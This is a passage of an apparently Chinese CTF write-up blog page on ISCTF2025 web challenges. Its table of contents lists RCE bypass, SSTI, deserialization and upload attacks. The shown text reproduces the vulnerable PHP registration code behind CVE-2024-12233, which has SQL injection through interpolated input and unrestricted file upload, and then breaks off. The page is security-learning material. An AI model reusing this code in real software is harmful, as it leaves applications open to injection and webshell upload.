<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta property="og:type" content="article">
<meta property="og:title" content="ISCTF2025Web题解">
<meta property="og:url" content="https://wanth3f1ag.top/2025/12/26/ISCTF2025Web%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203145522015.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203151124070.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203151726518.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203155205766.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251203155247502.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203162427261.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203163648818.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203170029053.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203184432341.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203184643762.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203191757822.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251204121054789.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251204131337932.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251223153532191.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251225145432873.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251225145942670.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251225164257135.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251227145932129.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251227150923177.png">
<meta property="article:published_time" content="2025-12-26T06:31:33.000Z">
<meta property="article:modified_time" content="2025-12-27T07:09:54.054Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="ISCTF2025">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/ISCTF2025/image-20251203145522015.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/12/26/ISCTF2025Web%E9%A2%98%E8%A7%A3/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/12/26/ISCTF2025Web%E9%A2%98%E8%A7%A3/","path":"2025/12/26/ISCTF2025Web题解/","title":"ISCTF2025Web题解"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ISCTF2025Web题解 | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#b-by-n0t1ce-b0ard"><span class="nav-number">1.</span> <span class="nav-text">b@by n0t1ce b0ard</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-12233"><span class="nav-number">1.1.</span> <span class="nav-text">#CVE-2024-12233</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezrce"><span class="nav-number">2.</span> <span class="nav-text">ezrce</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCEbypass"><span class="nav-number">2.1.</span> <span class="nav-text">#RCEbypass</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="nav-number">3.</span> <span class="nav-text">来签个到吧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">3.1.</span> <span class="nav-text">反序列化+文件读取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%BE%E8%BF%87%E7%9A%84bottle"><span class="nav-number">4.</span> <span class="nav-text">难过的bottle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssti%E6%96%9C%E4%BD%93%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">#ssti斜体字绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag%E5%88%B0%E5%BA%95%E5%9C%A8%E5%93%AA"><span class="nav-number">5.</span> <span class="nav-text">flag到底在哪</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">5.1.</span> <span class="nav-text">#万能密码+文件上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Who-am-I"><span class="nav-number">6.</span> <span class="nav-text">Who am I</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%A8%A1%E6%9D%BF%E6%9F%A5%E6%89%BE%E8%B7%AF%E5%BE%84"><span class="nav-number">6.1.</span> <span class="nav-text">#修改模板查找路径</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag%EF%BC%9F%E6%88%91%E5%B0%B1%E5%80%9F%E8%B5%B0%E4%BA%86%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">flag？我就借走了（复现）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="nav-number">7.1.</span> <span class="nav-text">#软连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass"><span class="nav-number">8.</span> <span class="nav-text">Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">8.1.</span> <span class="nav-text">#RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">8.2.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezpop%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">ezpop（复现）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">9.1.</span> <span class="nav-text">#PHP反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84poc"><span class="nav-number">9.2.</span> <span class="nav-text">最终的poc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mv-upload"><span class="nav-number">10.</span> <span class="nav-text">mv_upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mv%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">10.1.</span> <span class="nav-text">#mv参数注入+文件上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-upload"><span class="nav-number">11.</span> <span class="nav-text">include_upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phar%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">11.1.</span> <span class="nav-text">#phar文件上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8C%E7%94%9F%E5%BA%8F%E5%88%97"><span class="nav-number">12.</span> <span class="nav-text">双生序列</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">12.1.</span> <span class="nav-text">#pickle反序列化+php反序列化写入文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">12.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E6%AE%B5POC"><span class="nav-number">12.3.</span> <span class="nav-text">初段POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E6%80%9D%E8%B7%AF"><span class="nav-number">12.4.</span> <span class="nav-text">最终思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC"><span class="nav-number">12.5.</span> <span class="nav-text">最终POC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kaqiWeaponShop"><span class="nav-number">13.</span> <span class="nav-text">kaqiWeaponShop</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">178</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">121</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/12/26/ISCTF2025Web%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ISCTF2025Web题解 | root@wanth3f1ag">
      <meta itemprop="description" content=" ">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ISCTF2025Web题解
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-12-26 14:31:33" itemprop="dateCreated datePublished" datetime="2025-12-26T14:31:33+08:00">2025-12-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-27 15:09:54" itemprop="dateModified" datetime="2025-12-27T15:09:54+08:00">2025-12-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>52k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>47 分钟</span>
    </span>
</div>

            <div class="post-description"> </div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h1><h2 id="CVE-2024-12233"><a href="#CVE-2024-12233" class="headerlink" title="#CVE-2024-12233"></a>#CVE-2024-12233</h2><p>题目提示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在你以后的 CTF 历程中，你会遇到不少的大型 php 项目审计。</span><br><span class="line"></span><br><span class="line">然而，大多数情况下，你不一定需要完全自己审计出一个原创的漏洞（0day），而是可以利用已有的漏洞进行攻击（nday）。</span><br><span class="line"></span><br><span class="line">CVE 是这个世界上最大的漏洞数据库。复现 CVE 是每一个 web 手不可或缺的能力。接下来，尝试用好你的 google，去复现一个已经发布的 php 项目漏洞。</span><br><span class="line"></span><br><span class="line">CVE 编号：CVE-<span class="number">2024</span>-<span class="number">12233</span></span><br></pre></td></tr></table></figure>

<p>既然给编号了就去看看这个漏洞：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-12233%EF%BC%8C%E5%A4%A7%E8%87%B4%E6%84%8F%E6%80%9D%E6%98%AF%E7%BB%84%E4%BB%B6">https://nvd.nist.gov/vuln/detail/CVE-2024-12233，大致意思是组件</a> Profile Picture Handler 中 &#x2F;registration.php 文件对上传的文件处理逻辑不够导致存在任意文件上传</p>
<p>把附件下下来进行代码审计吧</p>
<p>有一个txt挺显眼的，给了用户和管理员的账号密码</p>
<p>既然是registration.php，那就看看这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;connection.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$save</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//check user alereay exists or not</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;select * from user where email=&#x27;<span class="subst">$e</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$err</span>= <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;This user already exists&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//dob</span></span><br><span class="line"><span class="variable">$dob</span>=<span class="variable">$yy</span>.<span class="string">&quot;-&quot;</span>.<span class="variable">$mm</span>.<span class="string">&quot;-&quot;</span>.<span class="variable">$dd</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hobbies</span></span><br><span class="line"><span class="variable">$hob</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$hob</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//image</span></span><br><span class="line"><span class="variable">$imageName</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;img&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//encrypt your password</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert into user values(&#x27;&#x27;,&#x27;<span class="subst">$n</span>&#x27;,&#x27;<span class="subst">$e</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;<span class="subst">$mob</span>&#x27;,&#x27;<span class="subst">$gen</span>&#x27;,&#x27;<span class="subst">$hob</span>&#x27;,&#x27;<span class="subst">$imageName</span>&#x27;,&#x27;<span class="subst">$dob</span>&#x27;,now())&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//upload image</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;images/<span class="subst">$e</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;img&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&quot;images/<span class="subst">$e</span>/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;img&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$err</span>=<span class="string">&quot;&lt;font color=&#x27;blue&#x27;&gt;Registration successfull !!&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;&lt;b&gt;REGISTRATION FORM&lt;/b&gt;&lt;/h2&gt;</span><br><span class="line">		&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">			&lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span> <span class="title">table</span>-<span class="title">bordered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">Tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">Td</span> <span class="title">colspan</span>=&quot;2&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> @$<span class="title">err</span>;?&gt;&lt;/<span class="title">Td</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">Tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Your</span> <span class="title">Name</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;&lt;<span class="title">input</span>  